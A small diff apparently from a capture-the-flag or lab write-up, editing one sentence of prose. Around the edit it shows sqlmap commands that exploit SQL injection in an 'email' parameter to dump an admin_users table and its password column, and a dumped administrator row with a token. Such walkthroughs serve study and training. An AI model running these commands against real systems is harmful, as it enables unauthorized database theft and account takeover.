@@ -112,7 +112,7 @@ sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users --dump
 | 1  | Administrator | <blank> | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
 +----+---------------+---------+---------------------+---------------------+--------------------------------------------------------------+
 ```
-We have a token. But no password. We're gonna try to get the password column now
+We have the name, the token etc. but no password. We're gonna try to get the password column now
 ```
 sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users -C password --dump
 ```
